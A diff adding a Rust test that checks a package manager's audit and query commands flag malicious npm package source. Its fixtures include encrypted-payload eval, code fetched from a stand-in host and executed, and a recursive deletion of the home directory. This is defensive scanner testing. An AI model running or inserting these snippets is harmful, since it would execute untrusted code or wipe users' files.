@@ -432,3 +432,87 @@ async fn install_audit_and_query_report_secret_uploads_as_critical_findings() {
         );
     }
 }
+
+#[tokio::test]
+async fn audit_and_query_expose_targeted_execution_and_deletion_findings() {
+    for (rule, severity, source) in [
+        (
+            "encrypted-execution",
+            "high",
+            "const crypto=require('crypto'); const decipher=crypto.createDecipheriv('aes-256-gcm',key,iv); eval(decipher.update(payload).toString());",
+        ),
+        (
+            "downloaded-execution",
+            "high",
+            "async function run(){const response=await fetch('https://collector.example');new Function(await response.text())();}",
+        ),
+        (
+            "destructive-filesystem",
+            "critical",
+            "const fs=require('fs'),os=require('os');fs.rmSync(os.homedir(),{recursive:true});",
+        ),
+    ] {
+        let mock = MockRegistry::start().await;
+        let name = "targeted-source-control";
+        let tarball = make_tarball_from_pkg_json(
+            serde_json::json!({"name": name, "version": "1.0.0", "license": "MIT"}),
+            &[("index.js", source.as_bytes())],
+        );
+        mock.with_package(name, "1.0.0", &tarball).await;
+        mock.with_osv_querybatch(vec![vec![]]).await;
+        let project = TempProject::empty(
+            r#"{"name":"consumer","version":"1.0.0","dependencies":{"targeted-source-control":"1.0.0"}}"#,
+        );
+        write_config(&project, "install-time-source-analysis = true\n");
+        let installed = lpm_with_registry_and_npm(&project, &mock.url())
+            .env("LPM_STORE_VERSION", "v2")
+            .args(["install", "--no-skills", "--no-editor-setup"])
+            .output()
+            .unwrap();
+        assert!(
+            installed.status.success(),
+            "{}",
+            String::from_utf8_lossy(&installed.stderr)
+        );
+        let audit = lpm_with_registry_and_npm(&project, &mock.url())
+            .env("LPM_OSV_URL", format!("{}/v1/querybatch", mock.url()))
+            .args(["--json", "audit", "--fail-on", "behavior"])
+            .output()
+            .unwrap();
+        assert_eq!(
+            audit.status.code(),
+            Some(1),
+            "{}",
+            String::from_utf8_lossy(&audit.stderr)
+        );
+        let envelope: serde_json::Value = serde_json::from_slice(&audit.stdout).unwrap();
+        let issue = envelope["packages"][0]["issues"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|issue| issue["rule_id"] == rule)
+            .unwrap();
+        assert_eq!(issue["severity"], severity);
+        assert_eq!(issue["evidence"][0]["path"], "index.js");
+        assert_eq!(issue["evidence"][0]["line"], 1);
+        insta::with_settings!({snapshot_suffix => rule}, {
+            insta::assert_json_snapshot!("audit_targeted_source_evidence", envelope, {
+                ".packages[].path" => "[PACKAGE_PATH]",
+                ".packages[].instance_id" => "[INSTANCE_ID]",
+            });
+        });
+        for selector in [format!(":{rule}"), format!(":{severity}")] {
+            let query = lpm_with_registry_and_npm(&project, &mock.url())
+                .args(["--json", "query", &selector, "--assert-none"])
+                .output()
+                .unwrap();
+            assert_eq!(
+                query.status.code(),
+                Some(1),
+                "{selector}: {}",
+                String::from_utf8_lossy(&query.stderr)
+            );
+            assert!(String::from_utf8_lossy(&query.stdout).contains(name));
+        }
+    }
+}
